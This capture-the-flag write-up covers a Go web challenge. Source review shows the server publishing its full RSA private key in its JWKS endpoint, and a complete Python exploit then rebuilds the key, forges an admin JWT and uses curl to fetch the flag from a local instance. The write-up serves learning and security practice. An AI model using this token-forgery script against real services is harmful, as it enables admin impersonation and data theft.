---
tags:
  - 🚩
up:
  - "[[02 - Impersonation]]"
  - "[[02 - Data Exfiltration]]"
platform: BKSEC Training
difficulty: Easy
creation_date: 2026-02-26
last_modified: 2026-02-26
---

# 🚩 [[BKSEC - Low Effort SNS 2]]
**Primary:** [[01 - Web Security]]

**Secondary:** [[02 - Impersonation]], [[02 - Data Exfiltration]]

**Related Techniques:** [[Docker White-box Challenge Enumeration]], [[[(incomplete) Cookie Cracking]]]

## Executive Summary
* **Key Technique:** Read and understand the white box. This leads to a private key leak that can then be used to forge a malicious **JWT token** that can bypass the security and allow impersonation as the admin to exfiltrate the flag. 
* **Status:** `Completed`

---
## White Box Enumeration

### Dockerfile
```docker
# Build stage0
FROM golang:1.24 AS build
WORKDIR /app

ENV GOPROXY=https://goproxy.io,direct
  
COPY go.* ./
RUN go mod download
  
COPY . .
RUN go build -o binary .
  
# Runtime stage
FROM gcr.io/distroless/base
WORKDIR /app 

COPY --from=build /app/binary /app/binary
  
ENTRYPOINT ["/app/binary"]
```
Nothing too special, only that since the image is distroless, it seems like OS command injection attack won't work.

### compose.yml
```yaml
services:
  web-low-eff-sns-2:
    build:
      context: .
    ports:
      - "8888:1337"
    environment:
      - ADMIN_PASSWORD=Abc@1234
      - FLAG=BKSEC{REDACTED}
```
This file is also rather normal, only about the ports (port 8888 on the host and the port 1337 on the container) and the environment variables. Now we know that the `flag` and `admin_passwork` is in the environment variables.

### go.mod
```go
require (
    github.com/gin-gonic/gin v1.10.0
    github.com/golang-jwt/jwt/v4 v4.5.1
    github.com/lestrrat-go/jwx/v3/jwk v3.0.0-alpha1
    golang.org/x/crypto v0.33.0
    modernc.org/sqlite v1.35.0
)
```

There were a few CVE that I found online, I'm not sure if they would work but it's certainly good to be a little mindful about these:
- `gin v1.10.0`: **CVE-2020-36567** - Arbitrary log line injection
- `golang-jwt/jwt/v4 v4.5.1`: CVE-2025-30204 : Denial of service

Interestingly there were 2 JWT-related library used which might be hinting a JWT vulnerability as there might be conflict between the two libraries that might cause a vulnerability.

The database uses `sqlite`, if possible I would also try to find a SQLi vulnerability.

### main.go
```go
[...]
for _, e := range os.Environ() {
	pair := strings.SplitN(e, "=", 2)
	fmt.Println(pair[0], pair[1])
}
[...]
```
The `admin_pass` and `flag` were printed to the console (stdout) on start up, if we can somehow reach `/proc/self/fd/1` we can read the flag.

```go
//  @securityDefinitions.apikey JWT
//  @in                         header
//  @name                       Authorization
//  @description                JWT Key for Authorization. Example: Authorization: Bearer XXXX
```
This says that the JWT must be attached to the request in the `Authorization` header so that I can access authentication-required endpoints.

### authentication/handler.go
```go
privateKey, err := rsa.GenerateKey(rand.Reader, 2048)
if err != nil {
	log.Fatalln("failed to create privkey:", err)
}

key, err := jwk.Import(privateKey)

if err != nil {
	log.Fatalln("failed to create jwks:", err)
}

if err := key.Set(jwk.KeyIDKey, "bksec-c307002e-823a-474b-94e3-c89252fb6b44"); err != nil {
	log.Fatalln("failed to add key id")
}

if err := key.Set(jwk.AlgorithmKey, "RS256"); err != nil {
	log.Fatalln("failed to add algorithm")
}

keySet := jwk.NewSet()
keySet.AddKey(key)
```
This is a **critical** private key leak. The private key is directly added to the **keySet** that is exposed to the public located in the `jwks.json` that will probably be mentioned somewhere in the code base.

### authentication/verify.go
```go
package authentication
  
import (
    "crypto/rsa"
    "fmt"
  
    "github.com/golang-jwt/jwt/v4"
)
  
func VerifyToken(tokenString string, pubKey *rsa.PublicKey) (jwt.MapClaims, error) {
    token, err := jwt.Parse(tokenString, func(t *jwt.Token) (interface{}, error) {
        if _, ok := t.Method.(*jwt.SigningMethodRSA); !ok {
            return nil, fmt.Errorf("got invalid signing method: %s", t.Method.Alg())
        }
        return pubKey, nil
    })
  
    if err != nil {
        return nil, err
    }
  
    claims, ok := token.Claims.(jwt.MapClaims)
    if !ok || !token.Valid {
        return nil, jwt.ErrSignatureInvalid
    }
  
    if err := claims.Valid(); err != nil {
        return nil, err
    }
  
    return claims, nil
}
```

It's true that the codebase is actually using `golang-jwt/jwt/v4` for verification while using `lestrrat-go/jwx/v3/jwk` for the authentication, however, the verification is actually decent with **no observable logic vulnerability**. However, there may still be a chance that I can **completely bypass the verification** with the leaked private key.

### database/db.go
```go
database/db.go:
```go
func InitAdminAccount(db *sql.DB) {
	insertUser := `INSERT INTO user (username, password, fullname, bio, secret, role)
                   VALUES (?, ?, ?, ?, ?, ?)`

	username := "admin"
	password := util.HashPassword(os.Getenv("ADMIN_PASSWORD"))
	bio := "The owner of low-effort-sns, a revolutionary idea to bring human closer to others."
	secret := fmt.Sprintf("Please don't tell anyone this. The flag is %s", os.Getenv("FLAG"))
	role := "admin"

	_, err := db.Exec(insertUser, username, password, username, bio, secret, role)
	if err != nil {
		log.Fatalln(err)
	}
}
```
This confirms that the `flag` is also stored inside the `user` table, `secret` column of the **admin**. So if I can somehow inject SQL I know which table to attack.

### docs/swagger.json
This file is the complete mapping of the API routes. There is a route called `/secret` that allow a user to fetch their own secret. Here, if I can login as the admin then I can fetch the flag without having to perform **SQLi**. 

```json
"/secret": {
	"get": {
		"description": "Fetches the secret associated with the currently logged-in user.",
		"produces": [
			"application/json"
		],
		"tags": [
			"Secret"
		],
		"summary": "View own secret",
		"responses": {
			"200": {
				"description": "User's secret",
				"schema": {
					"$ref": "#/definitions/model.Secret"
				}
			},
			"404": {
				"description": "User does not have a secret",
				"schema": {
					"type": "object",
					"additionalProperties": {
						"type": "string"
					}
				}
			},
			"500": {
				"description": "Internal server error",
				"schema": {
					"type": "object",
					"additionalProperties": {
						"type": "string"
					}
				}
			}
		}
	}
}
```
 
### handler/handlers.go

```go
package handler
  
import (
    "database/sql"
    "low-effort-sns-2/authentication"
    "low-effort-sns-2/middleware"
    "net/http"
  
    "github.com/gin-gonic/gin"
)
  
func SetupRoutes(router *gin.Engine, db *sql.DB, jwks *authentication.AuthenticationHandler) {
    loginHandler := NewLoginHandler(db, jwks)
    signUpHandler := NewSignUpHandler(db, jwks)
    profileHandler := NewProfileHandler(db)
    postHandler := NewPostHandler(db)
    secretHandler := NewSecretHandler(db)
  
    authMiddleware := middleware.NewAuthenticationMiddleware(jwks)
  
    router.GET("/.well-known/jwks.json", func(c *gin.Context) {
        c.JSON(http.StatusOK, jwks.KeySet)
    })
  
    router.GET("/", IndexHandler)
    router.GET("/ping", PingHandler)
    router.POST("/login", loginHandler.Login)
    router.POST("/signup", signUpHandler.Signup)
  
    protected := router.Group("/")
    protected.Use(authMiddleware.VerifyJWT())
    protected.GET("/protected", TestProtectedRoute)
    protected.GET("/profile", profileHandler.ViewOwnProfile)
    protected.GET("/profile/:id", profileHandler.ViewOtherProfile)
    protected.POST("/profile", profileHandler.UpdateProfile)
    protected.GET("/posts", postHandler.GetAllPost)
    protected.GET("/post/:id", postHandler.GetOnePost)
    protected.POST("/posts", postHandler.CreatePost)
    protected.GET("/secret", secretHandler.ViewOwnSecret)
  
    adminOnly := router.Group("/")
    adminOnly.Use(authMiddleware.VerifyJWT())
    adminOnly.Use(middleware.AdminOnlyMiddleware())
    adminOnly.GET("/secret/:id", secretHandler.ViewOneSecret)
}
```

Right in the middle of the file we can see the location of the `jwks.json` that might be leaking the private key.

### Other Handler Files
The `login.go` file actually tells me how the JWT that is returned to the user after they are logged in were formed:

 ```go
 token := jwt.NewWithClaims(jwt.SigningMethodRS256, jwt.MapClaims{
	"sub":      id,
	"username": loginData.Username,
	"role":     role,
	"exp":      time.Now().Add(time.Minute * 5).Unix(),
	"iat":      time.Now().Unix(),
})

token.Header["kid"] = "bksec-c307002e-823a-474b-94e3-c89252fb6b44"

tokenString, err := token.SignedString(h.JWKSHandler.PrivateKey)
 ```

Other than that I also take a look at other handlers, however no interesting findings. All SQL-related endpoints are carefully crafted with prepared statements that are invulnerable to SQLi.

---
## Exploitation
Since I already got the source code. Based on the information I've collected, I asked Gemini to craft for me an exploit script:
```python
import requests
import base64
import jwt
import time
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.backends import default_backend
  
BASE = 'http://localhost:8888/'
  
def base64url_to_int(b64_str):
    """Helper function to decode JWK Base64Url strings into Python integers."""
    # Add padding if necessary
    b64_str += "=" * ((4 - len(b64_str) % 4) % 4)
    # Decode url-safe base64
    decoded = base64.urlsafe_b64decode(b64_str)
    # Convert bytes to an integer
    return int.from_bytes(decoded, byteorder='big')

# 1. Fetch the JWKS from the server
try:
    url = BASE + '.well-known/jwks.json'
    response = requests.get(url)
    jwks = response.json()
except Exception as e:
    print(f"[-] Failed to fetch JWKS: {e}")
    exit(1)
  
# 2. Extract the key components
key_data = jwks['keys'][0]
kid = key_data['kid']
print(f"[*] Found Key ID (kid): {kid}")
print("[*] Extracting RSA parameters (d, p, q)...")
  
n = base64url_to_int(key_data['n'])
e = base64url_to_int(key_data['e'])
d = base64url_to_int(key_data['d'])
p = base64url_to_int(key_data['p'])
q = base64url_to_int(key_data['q'])
dp = base64url_to_int(key_data['dp'])
dq = base64url_to_int(key_data['dq'])
qi = base64url_to_int(key_data['qi'])
  
# 3. Reconstruct the RSA Private Key
print("[*] Reconstructing RSA Private Key object...")
public_numbers = rsa.RSAPublicNumbers(e, n)
private_numbers = rsa.RSAPrivateNumbers(p, q, d, dp, dq, qi, public_numbers)
private_key = private_numbers.private_key(default_backend())
  
# Convert to PEM format (which PyJWT expects for signing)
pem_private_key = private_key.private_bytes(
    encoding=serialization.Encoding.PEM,
    format=serialization.PrivateFormat.TraditionalOpenSSL,
    encryption_algorithm=serialization.NoEncryption()
)
  
# 4. Forge the Admin JWT
print("[*] Forging Admin JWT...")
  
# The exact claims we saw expected by the backend
payload = {
    "sub": "1",            # Usually 1 for the admin user
    "username": "admin",
    "role": "admin",       # This bypasses AdminOnlyMiddleware
    "iat": int(time.time()),
    "exp": int(time.time()) + 3600 # Valid for 1 hour
}
  
headers = {
    "kid": kid
}
  
# Sign the token using the stolen private key
forged_token = jwt.encode(
    payload,
    pem_private_key,
    algorithm="RS256",
    headers=headers
)
  
print("\n[+] Success! Here is your forged Admin JWT:")
print("-" * 60)
print(forged_token)
print("-" * 60)
```

After I got the forged token I attacked the `/secret` endpoint directly using `curl`:
```bash
curl -H "Authorization: Bearer <JWT>" http://localhost:8888/secret
```

## Loot & Flags
**Flag**: BKSEC{thanks_for_solving_my_challenge_222614bdc5e403e8}
